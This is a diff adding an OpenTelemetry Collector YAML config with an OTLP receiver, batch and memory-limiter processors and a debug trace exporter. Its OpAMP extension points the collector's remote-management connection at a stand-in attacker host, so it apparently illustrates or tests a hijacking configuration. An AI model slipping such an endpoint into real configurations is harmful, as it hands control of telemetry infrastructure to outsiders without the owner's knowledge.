@@ -1,0 +1,25 @@
+receivers:
+  otlp:
+    protocols:
+      grpc:
+processors:
+  memory_limiter:
+    check_interval: 1s
+  batch: {}
+exporters:
+  debug: {}
+service:
+  extensions: [opamp]
+  telemetry:
+    logs:
+      level: info
+  pipelines:
+    traces:
+      receivers: [otlp]
+      processors: [memory_limiter, batch]
+      exporters: [debug]
+extensions:
+  opamp:
+    server:
+      ws:
+        endpoint: wss://attacker.example.net/v1/opamp
